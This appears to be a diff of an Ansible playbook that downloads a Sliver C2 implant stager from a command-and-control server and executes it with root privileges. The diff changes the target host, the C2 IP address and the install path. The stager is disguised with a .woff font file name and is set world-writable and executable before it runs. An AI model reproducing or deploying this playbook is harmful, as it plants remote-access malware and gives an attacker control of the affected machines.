@@ -1,17 +1,17 @@
 ---
 - name: Download and execute sliver implant/stager
-  hosts: "192.168.86.25"
+  hosts: localhost
   become: true
   vars:
-    sliver_server_ip: "192.168.86.35" # SliverC2 IP
+    sliver_server_ip: "10.40.66.242" # SliverC2 IP
     sliver_server_port: 5555 # Sliver C2 server port
-    sliver_linux_stager: "COHERENT_DIARIST.woff"
+    sliver_linux_stager: "FIT_EQUIPMENT.woff"
 
   tasks:
     - name: Download sliver implant
       ansible.builtin.get_url:
         url: http://{{ sliver_server_ip }}:{{ sliver_server_port }}/{{ sliver_linux_stager }}
-        dest: /home/target/
+        dest: /home/opc/
         mode: 0777
       register: download_result
       retries: 3
@@ -19,6 +19,3 @@
 
     - name: Execute stager
       ansible.builtin.shell: ./{{ sliver_linux_stager }}
-      ansible.builtin.debug:
-        msg:
-        - "Implant, {{ sliver_linux_target }}, has successfully executed on target"
